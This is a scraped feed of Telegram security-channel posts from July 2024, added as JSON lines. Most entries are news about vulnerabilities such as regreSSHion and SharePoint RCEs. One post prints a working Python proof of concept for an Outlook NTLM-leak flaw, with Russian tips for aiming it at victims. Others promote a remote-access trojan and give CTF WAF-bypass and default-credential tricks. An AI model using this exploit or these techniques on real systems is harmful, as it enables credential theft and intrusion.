@@ -1,0 +1,135 @@
+{
+    "date": "2024-07-30",
+    "from_channel": "defcon_news",
+    "message": "Lesson from the Hotjar vulnerability: HTTP-Only (XSS protection) is not effective if you have OAuth\nhttps://www.reddit.com/r/netsec/comments/1ef7n29/lesson_from_the_hotjar_vulnerability_httponly_xss/",
+    "webpage_description": "Explore this post and more from the netsec community",
+    "webpage_url": "https://www.reddit.com/r/netsec/comments/1ef7n29/lesson_from_the_hotjar_vulnerability_httponly_xss/"
+}
+{
+    "date": "2024-07-30",
+    "from_channel": "cibsecurity",
+    "message": "🕵️‍♂️ OAuth+XSS Attack Threatens Millions of Web Users With Account Takeover 🕵️‍♂️\n\nAn attack flow that combines API flaws within \"log in with\" implementations and Web injection bugs could affect millions of websites.\n\n📖 Read more.\n\n🔗 Via \"Dark Reading\"\n\n----------\n👁️ Seen on @cibsecurity",
+    "webpage_description": "An attack flow that combines API flaws within \"log in with\" implementations and Web injection bugs could affect millions of websites.",
+    "webpage_url": "https://www.darkreading.com/endpoint-security/oauth-xss-attack-millions-web-users-account-takeover"
+}
+{
+    "date": "2024-07-29",
+    "from_channel": "proxy_bar",
+    "message": "2024-21413 /outlook RCE\n*\nPOC\n\nimport smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\ndef send_email():\n    # Get user input for sender's email address and password\n    sender_email = input(\"Enter your Outlook email address: \")\n    sender_password = input(\"Enter your Outlook email password: \")\n\n    # Get user input for receiver's email address\n    receiver_email = input(\"Enter the recipient's email address: \")\n\n    # Create a new message object\n    msg = MIMEMultipart()\n\n    # Add sender, receiver, and subject to the message\n    msg['From'] = sender_email\n    msg['To'] = receiver_email\n    msg['Subject'] = input(\"Enter email subject: \")\n\n    # Ask user if they want to add a link attachment\n    add_attachment = input(\"Do you want to add a link attachment? (yes/no): \").lower()\n    if add_attachment == 'yes':\n        html_content = \"\"\"\\\n        <!DOCTYPE html>\n        <html lang=\"en\">\n            <body>\n                <p><a href=\"file:///\\\\192.168.206.139/test/Doc.txt!xssvideo\">Salary docs</a></p>\n            </body>\n        </html>\"\"\"\n        msg.attach(MIMEText(html_content, 'html'))\n\n    # Connect to SMTP server and send email\n    with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:\n        server.starttls()\n        server.login(sender_email, sender_password)\n        server.send_message(msg)\n        print(\"Email sent successfully.\")\n\nif __name__ == \"__main__\":\n    send_email()\n\nНо есть пара НО:\n1. В строке 27 вам необходимо указать путь к файлу на вашем сервере (линк на rtf например)\n2. На линк жертве кликать не нужно, Office Protected View все сам сделает.\n3. Было мнение что нужно находиться в LAN жертвы, но как бы есть пара минут пока port established\n\n#outглюк #ntlm2"
+}
+{
+    "date": "2024-07-26",
+    "from_channel": "proxy_bar",
+    "message": "Xeno Rat\n*\nОпенсорсный РАТник, написан на C# и совместим с Windows 10, 11\n*\nКрыса умеет:\nHVNC\nLive Microphoneand camera\nSocks5 Reverse Proxy\nRegular Updates and Much More   (ну тут сомнительно)\nBuilt Completely from Scratch    (скорее минус чем плюс)\nUAC bypass (хммм)\nFun menu (праздник для души и мёд для ушей)\nну и куча всего\n\ndownload крысу\n\n#RAT #funny"
+}
+{
+    "date": "2024-07-23",
+    "from_channel": "sysadm_in_channel",
+    "message": "/ EvilVideo: Telegram app for Android targeted by zero-day exploit sending malicious videos\n\nhttps://www.eset.com/uk/about/newsroom/press-releases/set-research-discovers-evilvideo-telegram-app-for-android-targeted-by-zero-day-exploit-sending-malicious-videos/"
+}
+{
+    "date": "2024-07-18",
+    "from_channel": "cibsecurity",
+    "message": "🖋️ Cisco Warns of Critical Flaw Affecting On-Prem Smart Software Manager 🖋️\n\nCisco has released patches to address a maximumseverity security flaw impacting Smart Software Manager OnPrem Cisco SSM OnPrem that could enable a remote, unauthenticated attacker to change the password of any users, including those belonging to administrative users. The vulnerability, tracked as CVE202420419, carries a CVSS score of 10.0. \"This vulnerability is due to improper.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
+}
+{
+    "date": "2024-07-18",
+    "from_channel": "cibsecurity",
+    "message": "🌊 Digital Operational Resilience Testing (part of DORA) – What to Expect? 🌊\n\nA crucial infrastructure company overseeing gas storage and distribution faces a serious cybersecurity threat. So, they involve a penetration test team to assess the companys security posture. They uncovered a critical remote code execution RCE vulnerability in the companys main website connected to their Active Directory system. This vulnerability can provide attackers with unauthorized access  The post Digital Operational Resilience Testing part of DORA  What to Expect? appeared first on UnderDefense.\n\n📖 Read more.\n\n🔗 Via \"UnderDefense\"\n\n----------\n👁️ Seen on @cibsecurity",
+    "webpage_description": "A crucial infrastructure company overseeing gas storage and distribution faces a serious cybersecurity threat. So, they involve a penetration test team to assess the company’s security posture. They uncovered a critical remote code execution (RCE) vulnerability in the company’s main website connected to their Active Directory system. This vulnerability can provide attackers with unauthorized access […]",
+    "webpage_url": "https://underdefense.com/blog/digital-operational-resilience-testing-part-of-dora-what-to-expect/"
+}
+{
+    "date": "2024-07-18",
+    "from_channel": "cibsecurity",
+    "message": "🕵️‍♂️ Void Banshee APT Exploits Microsoft Zero-Day in Spear-Phishing Attacks 🕵️‍♂️\n\nThe threat group used CVE202438112 and a \"zombie\" version of IE to spread Atlantida Stealer through purported PDF versions of reference books.\n\n📖 Read more.\n\n🔗 Via \"Dark Reading\"\n\n----------\n👁️ Seen on @cibsecurity",
+    "webpage_description": "The threat group used CVE-2024-38112 and a \"zombie\" version of IE to spread Atlantida Stealer through purported PDF versions of reference books.",
+    "webpage_url": "https://www.darkreading.com/threat-intelligence/void-banshee-apt-microsoft-zero-day-spear-phishing-attacks"
+}
+{
+    "date": "2024-07-17",
+    "from_channel": "proxy_bar",
+    "message": "Havoc C2 Teamserver SSRF exploit \n*\nExploit\n\n#CC #C2 #havoc #hackBYhack"
+}
+{
+    "date": "2024-07-13",
+    "from_channel": "proxy_bar",
+    "message": "CVE-2024-34102\n*\nAdobe Commerce\nВерсии: 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8\nXXE vuln \n*\nExploit"
+}
+{
+    "date": "2024-07-11",
+    "from_channel": "cibsecurity",
+    "message": "🕵️‍♂️ Attackers Have Been Leveraging Microsoft Zero-Day for 18 Months 🕵️‍♂️\n\nLikely two separate threat actors are using the justpatched CVE202438112 in targeted, concurrent infostealer campaigns.\n\n📖 Read more.\n\n🔗 Via \"Dark Reading\"\n\n----------\n👁️ Seen on @cibsecurity",
+    "webpage_description": "Likely two separate threat actors are using the just-patched CVE-2024-38112 in targeted, concurrent infostealer campaigns.",
+    "webpage_url": "https://www.darkreading.com/application-security/attackers-have-been-leveraging-microsoft-zero-day-for-18-months"
+}
+{
+    "date": "2024-07-10",
+    "from_channel": "freedomf0x",
+    "message": "Microsoft #SharePoint Server 20219 — #RCE\n\nhttps://github.com/testanull/MS-SharePoint-July-Patch-RCE-PoC",
+    "webpage_description": "Contribute to testanull/MS-SharePoint-July-Patch-RCE-PoC development by creating an account on GitHub.",
+    "webpage_url": "https://github.com/testanull/MS-SharePoint-July-Patch-RCE-PoC"
+}
+{
+    "date": "2024-07-10",
+    "from_channel": "RalfHackerChannel",
+    "message": "🖼️ Microsoft SharePoint Server 20219 — RCE \n\nPoC for: \n— CVE-2024-38094\n— CVE-2024-38024\n— CVE-2024-38023\n\n🔗 Source:\nhttps://github.com/testanull/MS-SharePoint-July-Patch-RCE-PoC\n\n#sharepoint #poc #rce #cve"
+}
+{
+    "date": "2024-07-09",
+    "from_channel": "proxy_bar",
+    "message": "HEVD Exploit Windows 10 22H2 \n*\nLPE exploit"
+}
+{
+    "date": "2024-07-06",
+    "from_channel": "RalfHackerChannel",
+    "message": "————————————————————\n\nCVE-2024-37081: VMware vCenter Server Multiple LPE\n\nCVE-2024-22274: VMware vCenter Server RCE\n\n#exploit #pentest #redteam"
+}
+{
+    "date": "2024-07-05",
+    "from_channel": "defcon_news",
+    "message": "Major Security Flaws in Mailcow: Inside the XSS and Path Traversal Exploits (CVE-2024-31204 and CVE-2024-30270)\nhttps://www.reddit.com/r/netsec/comments/1dtmgh8/major_security_flaws_in_mailcow_inside_the_xss/",
+    "webpage_description": "Explore this post and more from the netsec community",
+    "webpage_url": "https://www.reddit.com/r/netsec/comments/1dtmgh8/major_security_flaws_in_mailcow_inside_the_xss/"
+}
+{
+    "date": "2024-07-04",
+    "from_channel": "cibsecurity",
+    "message": "🖋️ Microsoft Uncovers Critical Flaws in Rockwell Automation PanelView Plus 🖋️\n\nMicrosoft has revealed two security flaws in Rockwell Automation PanelView Plus that could be weaponized by remote, unauthenticated attackers to execute arbitrary code and trigger a denialofservice DoS condition. \"The remote code execution vulnerability in PanelView Plus involves two custom classes that can be abused to upload and load a malicious DLL into the device,\" security researcher.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
+}
+{
+    "date": "2024-07-03",
+    "from_channel": "ctfchat",
+    "message": "⛳️Когда настоящий  Attack/Defense только начинается⛳️\n\nПредставим,что уже прошли first blood'ы 🩸\nВот первые сплойты переписаны из трафика ✍️ \nПочти все команды запатчились 🩹   \nИ тут начинается самое интересное ...\n\nКазалось бы, ферма уже не приносит поинты с наших сплойтов и на этом все... \n\nНо это как раз тот момент, в котором надо копнуть чуть глубже...\n\nЭтот пост как раз и будет про классические bypass'ы неумелых патчей, или как можно нафармить халявные очки..😋\n\n❗️Простые правила на WAF'е❗️\nНекоторые команды, настраивающие WAF, могут забанить конкретную сигнатуру сплойта, например, \nfile:///etc/passwd , и казалось бы, сплойт не проходит, но тут нам в помощь приходит классический URL encoding, и наш file:///etc/passwd  превращается в %66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64.\nИзредка, но подобный енкодинг реально работает!\n\n❗️Открытые порты❗️\nОчень часто на A/D встречаются следующие строчки\n environment:\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n      - POSTGRES_DB=postgres\n    ports:\n      - 5432:5432\nПо идее, правильно было бы вообще закрыть торчащий наружу порт, но реально бывали случаи, когда некоторые 'умельцы' просто меняли внешний порт с 5432 на 5433 и т.д., оставив те же самые креды.\nЕсли заметили, что подобные сплойты перестали работать, то можно прогнать сервис через nmap.\n\n❗️Секретные ключи в файлах ❗️\nРеальный кейс с CTFCUP 2023, когда в сервисе был пробит LFI, благодаря которому  вытягивался secret_key, с помощью которого переподписывался JWT Token.\nКазалось бы, можно переместить secret_key в переменные окружения и все, через LFI его не достать, но...\nБольшинство команд просто поменяли стандартное название файла, в котором хранился secret_key, думая, что название файла не узнать. \nИ вот тут главная ошибка.. Название файла, содержащее,  secret_key все равно прописывается в main'е, в котором этот самый файл и импортируется. Таким образом, и была пробита большая часть команд, не задумавшихся о хорошем патче.\n\n❗️Стандартные конфиги снифферов❗️\nДля примера рассмотрим один из самых популярных снифферов Packmate\nПри его деплое нужно создать .env файл, в который могут загрузить стандартный конфиг с гитлаба https://gitlab.com/packmate/Packmate/-/blob/master/docs/SETUP.md\n# Локальный IP сервера, на который приходит игровой трафик\nPACKMATE_LOCAL_IP=ip\n# Имя пользователя для web-авторизации\nPACKMATE_WEB_LOGIN=SomeUser\n# Пароль для web-авторизации\nPACKMATE_WEB_PASSWORD=SomeSecurePassword\nИ тут опять классический вариант...\nСканим nmap'ом всю сетку и ищем порты, отличающиеся от игровых сервисов, находим Packmate, пробуем зайти под стандартными кредами, вдруг админ забыл их поменять.\nВ данном случае можно вытащить флаги вообще со всех сервисов команды.😋"
+}
+{
+    "date": "2024-07-02",
+    "from_channel": "defcon_news",
+    "message": "regreSSHion: RCE Vulnerability in OpenSSH (CVE-2024-6387)\nhttps://www.reddit.com/r/netsec/comments/1dtdhpo/regresshion_rce_vulnerability_in_openssh/",
+    "webpage_description": "Explore this post and more from the netsec community",
+    "webpage_url": "https://www.reddit.com/r/netsec/comments/1dtdhpo/regresshion_rce_vulnerability_in_openssh/?utm_source=ifttt"
+}
+{
+    "date": "2024-07-03",
+    "from_channel": "cibsecurity",
+    "message": "🕵️‍♂️ 'RegreSSHion' Bug Threatens Takeover of Millions of Linux Systems 🕵️‍♂️\n\nThe highseverity CVE20246387 in OpenSSH is a reintroduction of a 2006 flaw, and it allows unauthenticated RCE as root.\n\n📖 Read more.\n\n🔗 Via \"Dark Reading\"\n\n----------\n👁️ Seen on @cibsecurity",
+    "webpage_description": "The high-severity CVE-2024-6387 in OpenSSH is a reintroduction of a 2006 flaw, and it allows unauthenticated RCE as root.",
+    "webpage_url": "https://www.darkreading.com/cloud-security/regresshion-bug-threatens-takeover-of-millions-of-linux-systems"
+}
+{
+    "date": "2024-07-01",
+    "from_channel": "cibsecurity",
+    "message": "🖋️ New OpenSSH Vulnerability Could Lead to RCE as Root on Linux Systems 🖋️\n\nOpenSSH maintainers have released security updates to contain a critical security flaw that could result in unauthenticated remote code execution with root privileges in glibcbased Linux systems. The vulnerability, codenamed regreSSHion, has been assigned the CVE identifier CVE20246387. It resides in the OpenSSH server component, also known as sshd, which is designed to listen for connections.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
+}
+{
+    "date": "2024-07-01",
+    "from_channel": "cibsecurity",
+    "message": "🕵️‍♂️ Apple CocoaPods Bugs Expose Millions of Apps to Code Injection 🕵️‍♂️\n\nCritical dependency manager supply chain vulnerabilities have exposed millions and millions of devices to arbitrary malware for the better part of decade.\n\n📖 Read more.\n\n🔗 Via \"Dark Reading\"\n\n----------\n👁️ Seen on @cibsecurity",
+    "webpage_description": "Critical dependency manager supply chain vulnerabilities have exposed millions and millions of devices to arbitrary malware for the better part of decade.",
+    "webpage_url": "https://www.darkreading.com/cloud-security/apple-cocoapods-bugs-expose-apps-code-injection"
+}
+{
+    "date": "2024-07-01",
+    "from_channel": "RalfHackerChannel",
+    "message": "🖼️ RegreSSHion — OpenSSH Unauthenticated RCE\n\nThe Qualys Threat Research Unit has discovered a Remote Unauthenticated Code Execution vulnerability in OpenSSH’s server (sshd) in glibc-based Linux systems. CVE assigned to this vulnerability is CVE-2024-6387.\n\nThe vulnerability, which is a signal handler race condition in OpenSSH’s server (sshd), allows unauthenticated remote code execution (RCE) as root on glibc-based Linux systems.\n\n🔗 Research: \nhttps://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server\n\n🔗 PoC:\nhttps://github.com/7etsuo/cve-2024-6387-poc\n\n#openssh #glibc #rce #cve"
+}
